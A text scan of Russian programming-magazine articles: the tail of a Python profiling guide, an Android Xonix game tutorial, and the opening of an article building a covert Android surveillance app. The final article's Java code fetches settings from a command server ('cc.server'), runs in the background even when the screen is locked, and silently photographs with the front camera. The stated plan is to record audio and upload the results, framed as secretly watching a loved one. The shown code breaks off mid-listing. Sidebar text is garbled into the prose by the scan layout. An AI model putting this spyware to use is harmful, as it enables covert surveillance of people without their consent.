рым не требуется исходный код программы, но желательно, чтобы программа
была скомпилирована с нужными флагами. При профилировании рекоменду-
 ется использовать профайлер, созданный для языка программирования, с ко-
торым ты работаешь. Это удобно тем, что если инструмент заточен под кон-
 кретный язык программирования, то, например, в случае с Python в результате
профайлинга мы будем видеть привычные названия функции вместо системных
 вызовов. Тут подход совершенно такой же, как и при выборе дебаггера: есть
 универсальные, которые работают с любым кодом и часто доступны на боль-
шинстве Linux-хостов, а есть те, которые разрабатывались для специальных
нужд и, например, подходят только для разработки.
   Давай разберем подробнее, какие профилировщики бывают и каковы их
 особенности.

Статистические профайлеры (statistical profilers)
Мы уже сталкивались с представителем данного типа профилировщика в пре-
дыдущей статье. Такие профайлеры меньше всего влияют на производитель-
 ность профилируемого приложения, что, с одной стороны, хорошо, а с дру-
 гой — для достаточно точных результатов может потребоваться много времени.

Рис. 2. Статистический профайлер программы





 Как видно на рис. 2, если профайлер будет собирать данные каждые 60 мс,
 то некоторые функции в отчет не попадут. При запуске каждые 30 мс данных
предсказуемо будет больше, но все равно не все. Чем больше наша програм-
ма будет работать с профилировщиком, тем больше данных соберется, соот-
 ветственно, тем точнее будут результаты. С точки зрения математики это назы-
 вается статистическим приближением или аппроксимацией.
   Для Python самый актуальный статистический профайлер — plop. Остальные
уже несколько лет не развиваются. Если говорить не о Python-приложениях, то
 в кругах линуксоидов известен OProfile.

Профайлеры, основанные на событиях
(событийные, event-based profilers, deterministic)
 Как несложно догадаться из названия, данные типы профилировщиков при-
вязаны к событиям. Если статистические профайлеры срабатывают каждые N
 раз, то событийные профайлеры — в определенных случаях, например после
вызова функции или завершения работы функции.
   Такие профилировщики заметно точнее статистических, но точность здесь
 достигается в ущерб скорости работы. Из-за этого ты вряд ли захочешь ис-
 пользовать их в продакшене. В Python мы можем написать и свой профайлер
 с блек-джеком и фичами:

 import sys
 def profiler(frame, event, args):
     print(frame.f_lineno, event, args)
 sys.setprofile(profiler)
 def main(name):
     print('Hello, %s!' % name)
 if __name__ == '__main__':
     main('world')

Вся магия здесь происходит после вызова функции sys.setprofile, которая гово-
 рит интерпретатору, что теперь у нас есть профайлер. После этого интерпре-
 татор на каждое событие будет вызывать функцию profiler. К счастью или, нао-
 борот, к сожалению, у Python таких событий не так уж и много: вызов функции
 (call), возврат из функции (return) и обработка исключения (exception).
   Функция-профайлер должна принимать себе три параметра:
 •  frame — представляет собой текущий стековый фрейм выполнения нашей
   программы (sys._current_frames);
 •  event — строка, имя события;
 •  args — специальные аргументы, которые отличаются в зависимости от типа
   события.

Классическим примером такого профайлера в Python служит cProfile, который
 является частью стандартной библиотеки Python и написан в виде С-расшире-
 ния. В документации достаточно подробно написано о cProfile, поэтому повто-
 ряться здесь смысла нет.

Instrumentation-профайлеры
 Instrumentation-профайлеры — это профайлеры, ко-
торые используют специальный измерительный код,
встраиваемый  компилятором  или  интерпретатором
при компиляции программы. В качестве примера тако-
 го профайлера можно привести grof, который для сво-         INFO
ей работы требует бинарник, скомпилированный GCC
                                                                     Кроме sys.setprofile, с помощью ключа -pg.                                                                              существует также
                                                                        функция sys.settrace.
Ручное профилирование                                 Она имеет аналогичные
                                                                      параметры и вызываетсяНе стоит забывать также и о возможности ручного про-
                                                                         перед выполнением
филирования кода. Если мы уже нашли узкое место                                                                           новой локальной
 в коде, можно использовать так называемое ручное про-           области (local
филирование — способ профилирования, при котором         scope). Обе функции
                                                                              рекомендуетсямы руками вставляем код, измеряющий скорость рабо-                                                                              использовать только
 ты. Самым простым примером такого кода может быть            для разработки
                                                                             профайлеров,
                                                                               дебаггеров, написания import time                                                                                   утилит проверки
 t1 = time.time()                                                     покрытия кода (code
 save_to_db(model)                                                          coverage) и тому
                                                                                  подобного. t2 = time.time
 print(t2-t1)

Одной из часто встречающихся реализаций такого профилировщика можно
 считать такой декоратор:

 def profiler(func):
     def wrapper(*args, **kwargs):
         before = time.time()
         retval = func(*args, **kwargs)
         after = time.time()
         LOG.debug("Function '%s': %s", func.__name__, after-before)
     return wrapper
 @profiler
 def hello(name):
     print('Hello, %s' % name)

Решение настолько простое и эффективное, что мне даже нечего добавить.
Тем не менее следует помнить, что такой «профайлер» будет снижать скорость
работы программы, и использовать его в продакшене я бы не стал без крайней
 необходимости.
   Это, наверное, самый простой способ измерить скорость выполнения ка-
 кого-то участка кода, однако тут есть один, но достаточно большой недостаток:
необходимо не просто модифицировать код — нужно писать его. А это означа-
 ет, что с большой долей вероятности этот код будет нельзя переносить между
 проектами. Ведь такой код пишется не просто под нужды определенного про-
 екта, а под нужды определенной функции или нескольких функций. В этом же
и плюс: можно измерять только то, что нам надо, и тогда, когда это необходи-
 мо. Например, включать профилирование только с двух до пяти утра, когда по-
 сетителей сайта мало и производительностью можно немного пожертвовать.
Или мы можем включать такой «профайлер», когда сработает какое-то условие
 («пользователь нажал кнопку А и Б одновременно»), и проверить скорость ра-
боты нужной функции.
   Конечно, ты можешь сказать, что это можно делать и с помощью все того же
 plop или cProfile, и будешь прав. Но в этом случае ты никогда не добьешься той
 гибкости, которую могут дать стандартные способы.

МЕРЯЕМ СКОРОСТЬ КАЖДОЙ СТРОКИ
Когда мы уже нашли, какая функция выполняется дольше всего, мы хотим по-
 нять, что именно тормозит. Иногда вся проблема кроется всего в одной строке,
и угадать ее бывает непросто. И тогда стандартного cProfile нам не хватит — он
не умеет мерять скорость работы каждой строки. Тут на помощь нам приходит
 line_profiler от Роберта Керна (Robert Kern).
    line_profiler — это профайлер — обертка поверх cProfile, написанный также
на C и Python, который позволяет определять скорость выполнения каждой
 строки кода. Но поскольку такое профилирование было бы очень медленным,
 то line_profiler может профилировать только отдельные функции.

УСТАНОВКА И ИСПОЛЬЗОВАНИЕ LINE_PROFILER
 Установить line_profiler так же просто, как и любой Python-па-
 кет: pip install line_profiler. При установке из исход-
 ников также понадобится C-компилятор и Cython.
   Использовать его можно двумя способами. Так же,
 как и стандартный cProfile:
                                    WWW
 import line_profiler
                                                                                                   cProfile — всего лишь profiler = line_profiler.LineProfiler()
                                                                              высокоуровневая
 profiler.run('your python code')                                                                               обертка над lsprof.

И как набор command line утилит.
   Первый способ аналогичен работе с cProfile, поэтому описывать его я
не буду, а остановлюсь на втором.
   После установки line_profiler нам будет доступен CLI-скрипт под названием
 kernprof. Собственно, он и будет запускать профилировщик для сбора данных.
По умолчанию он использует стандартный Profiler, а для того, чтобы использо-
 вать построчный режим, необходимо передать ключ -l. Например:

 kernprof -l hello.py

Этой строчкой мы запустим наш скрипт hello.py в режиме построчного профили-
 рования. Но, поскольку это сильно увеличило бы время работы нашего скрип-
 та, line_profiler профилирует только ту функцию, которая обернута декоратором
 @profile. Декоратор @profile добавляется с помощью внесения в __builtins__
экземпляра класса LineProfiler с именем profiler. С одной стороны, это хоро-
шо: для использования профайлера нужен минимум изменений в коде, а с дру-
 гой — такая реализация грешит недостатками:
 •  нельзя измерять производительность всего скрипта — задача не частая,
   но иногда все-таки нужная; поэтому приходится оборачивать все в функцию
   main и вешать декоратор на нее;
 •  поскольку можно профилировать только одну функцию, профилировщик вы-
   берет только ту, на которой последний раз интерпретатор встретил наш де-
   коратор, — это связано с тем, как работают декораторы в Python;
 •  так как декоратор @profile добавляется в builtins c помо-
   щью скрипта kernprof, то, если наш скрипт запустить стан-
   дартным способом, мы увидим исключение NameError;
   с одной стороны, это большой минус, а с другой — отла-
   дочный код точно уж не попадет в продакшен.

 Kernprof только запускает профайлер и сохраняет резуль-                                    WWW
 таты его работы. По умолчанию для line_profiler это имя_
 скрипта.lprof.                                                                Когда                                                                              производительность
   Затем эти данные нужно как-то посмотреть. Делается                                                                                                           profile слишком
 это очень легко с помощью всего одной команды:                  мешает, можно
                                                                                попробовать
                                                                                          hotspot — это python -m line_profiler hello.py.lprof                                                                                   аналог модуля
                                                                                                            profile, но написан
 которая покажет нам, насколько быстро или медленно       он практически
                                                                             полностью на C. работает наша функция.





 Рис. 3. Line Profiler

 Тут мы видим не только какое время заняло выполнение каждой строки,
но и сколько раз она выполнялась, что очень полезно для циклов. Также мы уз-
 наем, сколько процентов времени от всего выполнения скрипта это заняло.

PERF — ПРОФИЛИРУЕМ НА УРОВНЕ ЯДРА
Говоря о профилировании в Linux, нельзя не сказать о perf. Perf — это профи-
лировщик уровня ядра. Он доступен в любых дистрибутивах с ядром начиная
 с версии 2.6. В Ubuntu устанавливается не сложнее, чем любая другая про-
 грамма:

 sudo apt-get install linux-tools-common

Данный профайлер работает достаточно быстро и с мини-
мумом накладных расходов. Для описания всех функций по-
 требуется отдельная статья, поэтому здесь я остановлюсь
 только на двух самых простых.                                    WWW
   Запустить профайлер и записать результаты их работы
                                                                             Сравнениеможно командой
                                                                            веб-фреймвор-
                                                                                            ков, написанных
 perf record cmd                                                            на Python.

После этого в текущей директории появится файл perf.dat,
который можно просмотреть с помощью команды perf report. Результат ее рабо-
 ты показан на рис. 4. Как видишь, perf ничего не знает про Python-код, поэтому
 результаты его работы нужно будет еще научиться правильно интерпретировать.
 Хотя если ты можешь на лету преобразовывать Python-код в соответствующий
ему C-код, то это не понадобится :).





 Рис. 4. Результат работы perf

Но если такой вариант совсем не подходит, можно использовать perf-script-
 python. К сожалению, для этого нам понадобится собрать свой perf для того
 ядра, которое используется в конкретном дистрибутиве. Для этого предвари-
 тельно нужно установить пакет python-dev (для Ubuntu).

ВМЕСТО ЗАКЛЮЧЕНИЯ
В этой статье мы описали только самые распространенные способы профи-
лирования Python-приложений. Имея в руках cPython и perf, можно измерять
 скорость практически чего угодно. Главное — использовать эти инструмен-
 ты и знания только при необходимости и не ударяться при этом в крайности.
Ведь в первую очередь софт пишется для пользователей, а уже потом идет все
 остальное. Хорошего тебе профайлинга, и до встречи в следующий раз.
Кодинг
      XONIX
 ДЛЯ ANDROID

       СДЕЛАНО СТАНДАРТНЫМИ
      СРЕДСТВАМИ ANDROID SDK!





                                    Владимир Петрович
                                        Тимофеев
                                                       rusdelphi.com





Хочется иногда взять и отдохнуть от всех этих фрей-
мворков, движков и готовых библиотек. Точнее, не от-
дохнуть, а напрячься — взять и накодить какую-ни-
будь игрушку исключительно с помощью стандартных
средств. Какую именно? Выбрать легко, ведь в серд-
це любого программера неизменно живут три игры,
созданные в прошлом веке: Tetris,
Digger и Xonix. Кстати, эту статью
имеет смысл читать даже в том слу-
чае, если ты не планируешь вды-
хать новую жизнь в игры нашего
детства, ведь настоящая цель этого
материала — показать тебе работу
с холстом, шрифтами, графически-
ми объектами, потоками, стандарт-    Xonix — ну кто его не знает?
ной архитектурой приложений и на-
следованием. Поехали!

ИНСТРУМЕНТАРИЙ И ЛОГИКА
Разработку будем вести в рекомендованной самой компанией Google Android
Studio. Все, что нам понадобится, легко найти по ссылке.
   Создадим пустой проект и все классы будем добавлять вручную. Вся игра
будет состоять из пяти классов активити, четыре из которых мы опишем в ма-
нифесте, а пятый будет родителем для всех предыдущих, то есть все классы
активити будут наследоваться от одной — так получится меньше кода. Давать
старт приложению будет SplashActivity, она после временной задержки вызо-
вет MainMenuActivity, оттуда можно будет зайти в настройки
SettingsActivity или запустить основную часть игры, распо-
ложенную в GameActivity. Все активити (кроме последней)
будут реализовывать свой интерфейс самым стандартным
из всех способом, а именно описанием элементов в XML
файлах разметки (layout).
   Основное игровое поле нарисуем на наследнике класса
                                    WWWSurfaceView. Отрисовка будет выполняться в параллельном
основному UI-потоке. Сейчас рассмотрим тот класс, ко-                                                                         Исходные коды
торый не попал в манифест, но сэкономит нам много кода         на гитхабе
и времени.

КЛАСС BASEACTIVITY
Чтобы экран устройства не выключался во время работы приложения, созда-
дим класс BaseActivity и от него унаследуем все Activity приложения:

public class BaseActivity extends Activity {
   @Override
   protected void onCreate(Bundle savedInstanceState) {
       super.onCreate(savedInstanceState);
       // Убрали заголовок
       requestWindowFeature(Window.FEATURE_NO_TITLE);
       // Убрали отключение экрана и выставили полноэкранный режим
       getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
       // Задали портретную ориентацию
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
       // Задали анимацию при запуске активности
       overridePendingTransition(android.R.anim.slide_in_left,
                                 android.R.anim.slide_out_right);
   }
}

Этот класс обеспечит нас активностью без заголовка, с портретной ориента-
цией, не гаснущим из-за экономии энергии экраном и анимацией появления
каждой новой активности.

ОКНО ПРИВЕТСТВИЯ
Компания Google не рекомендует использовать окно приветствия (Splash
Screen) в приложениях. Но рекомендация не значит запрет, мне очень хочется
показать, как оно делается, поэтому мы реализуем его при помощи простого
класса SplashActivity:

public class SplashActivity extends BaseActivity {
 @Override
   protected void onCreate(Bundle savedInstanceState) {
       super.onCreate(savedInstanceState);
       setContentView(R.layout.activity_splash);
       new Handler().postDelayed(new Runnable() {
           @Override
           public void run() {
               startActivity(new Intent(
                   SplashActivity.this, MainMenuActivity.class));
                 finish();
           }
       }, 2000);
   }
}

Здесь мы просто показываем нашу разметку setContentView(R.layout.activity_
splash). По истечении 2000 мс запустим MainMenuActivity, а саму ее выключим
методом finish(). Нужно заметить, что окно приветствия бывает полезно, когда
нужно сделать подготовку для работы приложения, например скопировать БД
или быстро что-то скачать из Сети.
   Ну а в это время пользователю следует показать красивый логотип — как это
ни парадоксально, среднему юзеру такое ожидание даже нравится, у него соз-
дастся впечатление, что приложение серьезное, раз оно что-то долго просчи-
тывает перед запуском. Этим пользуются некоторые разработчики: показыва-
ют перед запуском крутящиеся колесики (ProgressBar), хотя ничего полезного
в этот момент не делается.
   Чтобы навести некоторую красоту и самобытность, мы можем использовать
шрифты TTF и OTF. Применять их можно двумя способами:
1. Динамически, то есть во время работы приложения устанавливать нужному
   элементу нужный шрифт методом setTypeface().
2. Статически — переопределив стандартный компонент отображения и про-
   писав его в файле разметки.

В нашем приложении будут реализованы оба способа. Положим файл шриф-
та Dots.ttf в папку assets. Разметку первых двух экранов реализуем статически.
Для этого создадим класс MyTextView, наследника от стандартного TextView.
Зададим ему стиль в файле attrs.xml .
   Основной метод класса init():

private void init(AttributeSet attrs) {
   if (attrs != null) {
       TypedArray a = getContext().
            obtainStyledAttributes(attrs, R.styleable.MyTextView);
       String fontName =
            a.getString(R.styleable.MyTextView_fontName);
       if (fontName != null) {
           Typeface myTypeface = Typeface.createFromAsset(
               getContext().getAssets(), fontName);
           setTypeface(myTypeface);
       }
       a.recycle();
   }
}

В разметке activity_splash.xml пропишем наш класс:

<com.rusdelphi.xonix.MyTextView
   android:layout_width="wrap_content"
   android:layout_height="wrap_content"
   android:layout_centerHorizontal="true"
   android:layout_centerVertical="true"
   android:text="@string/app_name"
   android:textSize="40sp"
   android:textStyle="bold"
   customfont:fontName="Dots.ttf" />

Применим свой шрифт динамически, во время рисования текста на игровом
поле (рис. 1).





Рис. 1. Вид экрана окна приветствия

В основном меню реализуем три кнопки: саму игру, настройки и другие прило-
жения. Начнем с последнего. Для того чтобы дать пользователю возможность
насладиться другими приложениями автора, достаточно прописать одну строч-
ку — поисковый запрос с именем автора:

startActivity(new Intent(Intent.ACTION_VIEW,
    Uri.parse("market://search?q=pub:Василий Пупкин")));

То есть запускаем программу через определенные намерения.





Рис. 2. Вид экрана главного меню

Приложение должно обрабатывать Uri со строкой market. Система сама опре-
деляет по описанию в манифестах, какие приложения смогут обработать такое
намерение, и, если их несколько, предложит сделать выбор (рис. 3).





Рис. 3. Выбор маркета

В   настройках   (SettingsActivity)   используется  стандартный  механизм
SharedPreferences. Все настройки вынесены в отдельный класс Preference.
При старте активности (onStart()) с настройками, мы загружаем нужные на-
стройки в контролы. Если мы изменили настройки, то они сохранятся при выхо-
де из активности (onStop()). В настройках мы указываем скорость игры и коли-
чество жизней при старте игрового процесса.
   Игровая активность GameActivity также является наследником BaseActivity.
От родителя она унаследовала все описанные выше полезные свойства, так
что нам остается только реализовать саму игру. Во время создания этой ак-
тивности мы вместо привычного указания XML-файла с разметкой элементов
(layout) укажем для экрана собственный класс DrawView, который является на-
следником SurfaceView:

@Override
protected void onCreate(Bundle savedInstanceState) {
   super.onCreate(savedInstanceState);
   self = this;
   ctx = this;
   mDrawView = new DrawView(this);
   setContentView(mDrawView);
   DisplayMetrics dimension = new DisplayMetrics();
   getWindowManager().getDefaultDisplay().getMetrics(dimension);
   int width = dimension.widthPixels;
   int height = dimension.heightPixels;
   if (width < height)
       mSidePopup = (int) (width * 0.8);
   else
       mSidePopup = (int) (height * 0.8);
}

Тут же мы получаем параметры экрана (wight,height), которые будем использо-
вать при создании всплывающего окна (PopupWindow) с сообщением об окон-
чании игры.

КЛАСС SURFACEVIEW
SurfaceView — обертка вокруг класса SurfaceHolder, который, в свою очередь,
служит оберткой класса Surface, используемого для обновления изображения
из фоновых потоков. Особенность класса SurfaceView заключается в том, что он
предоставляет отдельную область для рисования, действия с которой должны
быть вынесены в отдельный поток приложения. Таким образом, приложению
не нужно ждать, пока система будет готова к отрисовке всей иерархии View-э-
лементов. Вспомогательный поток может использовать холст (Сanvas) нашего
SurfaceView для отрисовки с той скоростью, которая необходима.
   Вся реализация сводится к двум основным моментам:
1. Создание класса, унаследованного от SurfaceView и реализующего интер-
  фейс SurfaceHolder.Callback.
2. Создание потока, который будет управлять отрисовкой.

КЛАСС CANVAS
Класс Canvas предоставляет методы для рисования, которые отобража-
ют графические примитивы на исходном растровом изображении. При этом
надо сначала подготовить кисть (класс Paint), который позволяет указывать,
как именно графические примитивы должны отображаться на растровом изо-
бражении (цвет, обводка, стиль, сглаживание шрифта и так далее). Также нуж-
но указать Bitmap — поверхность, на которой происходит рисование. Android
поддерживает полупрозрачность, градиентные заливки, округленные прямоу-
гольники и сглаживание. Из-за ограничения ресурсов векторная графика пока
что не поддерживается, вместо этого используется традиционная растровая
перерисовка.
   Класс Canvas можно назвать оберткой вокруг растрового изображения, ко-
торое мы будем использовать в качестве полотна для своих художественных
опытов. Он предоставляет набор методов вида draw* для создания изображе-
ний котов и других объектов.

КЛАСС DRAWVIEW
В  классе DrawView мы будем  отлавливать события нажатия на экран
(onTouchEvent) и запускать рабочий поток DrawThread, реализующий всю игро-
вую логику и работающий с холстом. Монстр в игре движется сам, а вот игро-
ком нужно управлять. Путем нехитрых вычислений определим четыре жеста:

@Override
public boolean onTouchEvent(MotionEvent touchevent) {
   switch (touchevent.getAction()) {
       // Определяем координаты первого касания
       case MotionEvent.ACTION_DOWN: {
           x1 = touchevent.getX();
           y1 = touchevent.getY();
           break;
       }
       case MotionEvent.ACTION_UP: {
           x2 = touchevent.getX();
           y2 = touchevent.getY();
              float dx = x2 - x1;
              float dy = y2 - y1;
           if (Math.abs(dx) > Math.abs(dy)) {
               if (dx > 0)
                   DrawThread.playerDirection = "right";
               if (dx < 0)
                   DrawThread.playerDirection = "left";
           } else {
               if (dy > 0)
                   DrawThread.playerDirection = "down";
               if (dy < 0)
                   DrawThread.playerDirection = "up";
           }
       }
       break;
   }
   return true;
}

В методе surfaceCreated() получим элементы для холста и запустим поток отри-
совки, а в surfaceDestroyed(), наоборот, завершим его:

@Override
public void surfaceCreated(SurfaceHolder holder) {
   Preference prefs =
        new Preference(getContext()); // Получили настройки
   int indent = Tools.dpToPx(5); // Отступ между элементами
   int side = (getWidth() / 40) - indent; // Размер квадрата
   int startY = (getHeight() - (side + indent) * 20) / 2;
   int startX = 5;
   int i, j;
   for (i = 0; i < 40; i++)
       for (j = 0; j < 20; j++) {
           int x1 = startX + side * i + indent * i;
           int y1 = startY + side * j + indent * j;
           int x2 = startX + side * i + side + indent * i;
           int y2 = startY + side * j + side + indent * j;
           if (i == 0 || i == 39 || j == 0 || j == 19)
               matrixField[i][j] =
               new QuadrateItem(x1, y1, x2, y2, Color.BLUE);
           else
               matrixField[i][j] =
               new QuadrateItem(x1, y1, x2, y2, Color.TRANSPARENT);
       }
   Activity activity = (Activity) getContext();
   drawThread = new DrawThread(getHolder(), getResources(),
        matrixField,prefs.getData(Preference.GAME_SPEED),
        prefs.getData(Preference.NUMBER_OF_LIFES),activity);
   drawThread.setRunning(true);
   drawThread.start();
}
@Override
public void surfaceDestroyed(SurfaceHolder holder) {
   boolean retry = true;
   drawThread.setRunning(false);
   while (retry) {
       try {
           drawThread.join();
           retry = false;
       } catch (InterruptedException e) {
       }
   }
}

Наше игровое поле состоит из верхней надписи и матрицы квадратов 40 х 20,
в которой и будет разворачиваться вся игровая драма.
  Все рисование выполняется на холсте, то есть на классе Canvas. В потоке
мы получаем его:

canvas = surfaceHolder.lockCanvas(null);

Рисуем на нем:

canvas.drawColor(Color.BLACK);

или:

public void drawRect(Canvas canvas, QuadrateItem item) {
   Rect myRect = new Rect();
   myRect.set(item.x1, item.y1, item.x2, item.y2);
   Paint itemPaint = new Paint();
   itemPaint.setColor(item.color);
   itemPaint.setStyle(Paint.Style.FILL);
   canvas.drawRect(myRect, itemPaint);
}

и возвращаем обновленным:

surfaceHolder.unlockCanvasAndPost(canvas);

Саму логику игры, думаю, описывать излишне. Если количество жизней стало
меньше единицы, то покажем Game Over — экран окончания.





Рис. 4. Экран окончания

ЗАКЛЮЧЕНИЕ
В наше время существует много инструментов разработки игр для Android, в том
числе и онлайн-редакторы. Работа их сводится к оборачиванию JavaScript-ко-
да в приложение с компонентом WebView, то есть в обычный браузер. Нужно
отметить, что сам JS в ОС Android урезан, дальше песочницы браузера он вы-
йти не может и, следовательно, к многим функциям самого устройства доступа
не имеет. Не говоря уже об ошибках браузера, который обновляется только
на последних версиях ОС. В общем, о подобных поделках в приличном обще-
стве лучше помолчать. Работа с фреймворками накладывает ошибки програм-
миста на ошибки самой платформы, что в итоге приводит к множеству проблем,
зачастую даже неразрешимых. Поэтому, если ты хочешь сделать хорошую игру,

Перед публикацией приложения в маркете

Не забудь воспользоваться хорошим инструментом для очистки проекта, ко-
торый входит в Android Studio Имя ему Analyze — Inspect Code. В результате ты
получишь список найденных замечаний в проекте — от неиспользуемых ресур-
сов до ненужных переменных. Учти эти замечания, оптимизируй проект!


Зарабатываем денежки

Есть несколько способов монетизации своих трудов:
1. Встроить рекламу и получать деньги за клики или просмотры.
2. Продавать приложения.
3. Встроить покупки в приложения.
4. Шпионить за пользователем и отправлять узнанное «куда надо» (см. Angry
    Birds).
5. Комбинация вышеперечисленного.

Обычно опенсорсники реализуют кнопочку с пожертвованиями, но пожерт-
вования при этом должны проходить через Google, иначе он не получит
свои 30%, обидится и забанит приложение в маркете. Есть два варианта такой
реализации — предложить платную версию приложения или реализовать по-
купку внутри приложения (In-app Billing). Для платной версии просто указываем
ссылку на платную версию в маркете. Для «встроенных покупок» есть механизм
In-app Billing.
   Через «встроенную покупку» в игре можно добавлять игровые бонусы, от-
ключать рекламу или просто жертвовать на пиво, но отслеживать покупки надо
через свой сервер, так как механизм Google уже давно взломали приложениями
типа Freedom. Сами покупки регистрируются в консоли разработчика в разде-
ле «Контент для продажи». За более подробной информацией по In-app Billing
API добро пожаловать сюда, а здесь есть хорошие примеры с кодом.
Кодинг
ANDROID КАК
СРЕДСТВО
НАБЛЮДЕНИЯ
          СЛЕДИМ ЗА
         ПРОИСХОДЯЩИМ
            ВОКРУГ, НЕ
          БЕСПОКОЯ
           ВЛАДЕЛЬЦА
          ТЕЛЕФОНА





                                          Андрей Пахомов
                                                         mailforpahomov
                                                     @gmail.com



Для всех нас безопасность близких людей стоит на
первом месте. Вспомни ощущения, когда важный
тебе человек не отвечает на звонки, а сообщения
в WhatsApp остаются непрочитанными. В такие мо-
менты мы готовы многое отдать, лишь бы получить
представление о том, что же там происходит.
Конечно, сотовые операторы предоставляют
услуги по геолокации абонента, но информация,
что «девушка находится где-то посередине» Большой
Дмитровки, душу не успокаивает. Посмотрим,
что мы можем с этим сделать.


СТАВИМ ЦЕЛИ
К счастью, мы живем в то прекрасное время, когда от же-
лаемого до действительного — пара строчек кода. Давай
проверим, чем нам может помочь современный мобиль-
ный телефон на базе ОС Android.
   Сегодня мы напишем маленькую программу, которая
в фоновом режиме будет собирать из окружающего про-      WARNING
странства важные для нас данные, а затем отправлять их                                                                      Вся информация предо-
на указанный интернет-ресурс.                                                                            ставлена исключитель-
  В статье из позапрошлого номера «Повелитель ботов      но в ознакомительных
на Android» мы написали хорошее и полезное приложе-      целях. Ни редакция, ни
                                                                             автор не несут ответ-
ние, но у него был один недостаток: его нельзя запустить                                                                             ственности за любой
для работы в фоне и пойти заниматься своими делами.     возможный вред, при-
Все дело в так называемом жизненном цикле приложения     чиненный материалами
                                                                           данной статьи.(Activity lifecyсle). Советую изучить официальные матери-
алы по теме, а пока коротко скажу так: как только систе-
ма видит, что пользователь перестал работать в приложении, оно становится
в очередь на выгрузку из памяти для освобождения ресурсов под другие за-
дачи. Поэтому, если мы хотим денно и нощно следить за окружающим миром
с помощью телефона, придется действовать по-другому.
   Пусть наша программа периодически самостоятельно запускается, делает
фотографию с фронтальной камеры и пишет звук с микрофона, после чего по-
лученные данные должны отправляться в интернет на указанный нами сервер.
Для большей гибкости включим в нее возможность менять настройки поведе-
ния, периодически загружая из интернета конфигурационный файл.





Рис. 1. Блок-схема приложения

В БОЙ!
Начнем с конфигурационного файла. Для удобства работы
будем раз в день загружать из сети XML-файл и парсить его
с помощью библиотеки XMLPullParser. В данном случае мы
проверяем наличие открывающихся тегов audio и photo.
Естественно, этот класс позволяет и большее, поэтому
проблем с созданием гибких настроек не будет. Непосред-       INFO
ственно настройки будут храниться в SharedPreferences,
                                                                         Здесь рассмотрен
их мы уже много раз использовали, рекомендую проли-                                                                         совсем небольшой
стать предыдущие статьи.                                          фрагмент возможно-
                                                                                    стей, которые перед
                                                                     нами открываются.XmlPullParserFactory factory =                                                                          Надеюсь, теперь
    XmlPullParserFactory.newInstance();                        понятно, почему на
factory.setNamespaceAware(true);                              важных переговорах
                                                                               требуется именноXmlPullParser parser = factory.newPullParser();                                                                          выключить телефон,
// Загружаем XML-файл с указанного ресурса методом                                                                            а не перевести в его
GET и считываем данные с помощью класса InputStream         в авиарежим?
HttpURLConnection urlConnection = null;
URL url = new URL("http://cc.server/config.xml");
urlConnection = (HttpURLConnection) url.openConnection();
urlConnection.setRequestMethod("GET");
urlConnection.connect();
InputStream input = urlConnection.getInputStream();
parser.setInput(input, null);
int eventType = parser.getEventType();
// Исследуем загруженный XML-файл на предмет открывающихся тегов
while(eventType != XmlPullParser.END_DOCUMENT)
{
    if(eventType == XmlPullParser.START_TAG)
    {
        if (parser.getName().contains("photo"))
            {ConfigUpdater.isPhoto=true;}
        else if (parser.getName().contains("audio"))
            {ConfigUpdater.isAudio=true;}
        eventType = parser.next();
    }
 }

Класс AsyncTask позволяет в фоновом режиме выполнить ресурсоемкую за-
дачу. Самый яркий пример — работа с сетевыми ресурсами. Загружая файлы
в фоновом режиме, мы позволяем основной программе продолжать свою ра-
боту без создания ощущения «подвисания».

public class LoadConfig extends AsyncTask<String, Void,Boolean> {
    private Exception exception;
    @Override
    protected Boolean doInBackground(String... urls) {
        try
        {
            // Запускаем в отдельном процессе функцию по загрузке
и чтению конфигурационного файла
            parseXml();
        }
        catch (Exception e)
        {
            this.exception = e;
            return null;
        }
        return null;
    }
}

BroadcastReceiver — тот самый класс, позволяющий зарегистрироваться в си-
стеме на получение уведомлений о наступающих в операционной системе
событиях. Получив такое уведомление, приложение обретает возможность
выполнить заданный разработчиком набор команд. Зарегистрировав прило-
жение как получателя системного события, ОС самостоятельно запустит метод
onReceive в соответствующем классе при наступлении ожидаемого момента.
Этот метод выполнится даже в случае, если экран телефона заблокирован или
активно другое ресурсоемкое приложение.

public void onReceive(Context context, Intent intent) {
    // Запускаем с помощью AsyncTask загрузку и обработку
конфигурационного файла
    new LoadConfig().execute();
    // Полученные результаты заносим в SharedPreferences
    sp = context.getSharedPreferences("Config", context.MODE_PRIVATE);
    sp.edit().putBoolean("isAudio", isAudio).commit();
    sp.edit().putBoolean("isPhoto", isPhoto).commit();
}

В ОС Android есть возможность работать с камерой как через графический
Intent, так и программно без участия пользователя. Второй способ даст возмож-
ность делать фотографии тихо и совершенно незаметно. Достаточно вычис-
лить идентификатор нужной нам камеры и реализовать метод onPictureTaken
класса PictureCallBack.

private int findFrontFacingCamera() {
    int cameraId = -1;
    int numberOfCameras = Camera.getNumberOfCameras();
    for (int i = 0; i < numberOfCameras; i++)
    {
        CameraInfo info = new CameraInfo();
        Camera.getCameraInfo(i, info);
        // Переберем все камеры в наличии и выберем фронтальную
        if (info.facing == CameraInfo.CAMERA_FACING_FRONT)
        {
            cameraId = i;
            break;
        }
    }
    return cameraId;
}
cameraId = findFrontFacingCamera();
// Создаем экземпляр класса PhotoHandler, нужен непосредственно для
сохранения получившейся фотографии
PhotoHandler phHandler = new PhotoHandler(camera);
phHandler.setFile(file);
camera.reconnect();
camera.startPreview();
camera.takePicture(null, null,phHandler);

Вот как PhotoHandler реализуется. При создании фотографии ОС вызовет ме-
тод onPictureTaken, которому в качестве аргумента будет передан массив бай-
тов с получившейся фотографией.

public class PhotoHandler implements PictureCallback {
    @Override
    public void onPictureTaken(byte[] data, Camera camera) {
        // Массив байтов записываем в выбранный файл
        FileOutputStream fos = new FileOutputStream(pictureFile);
        fos.write(data);
        fos.close();
        ourCamera.release();
        ...
    }
}

И с той же легкостью запишем звук с микрофона. Сделать это можно с помо-
щью класса MediaRecorder. Он позволяет записывать как звук, так и видео (ви-
део? Конечно же, мы не будем никого снимать, тем более если человек об этом
не знает), в зависимости от заданных параметров.

MediaRecorder myAudioRecorder;
String outputFile = audioFile.toString();
myAudioRecorder=new MediaRecorder();
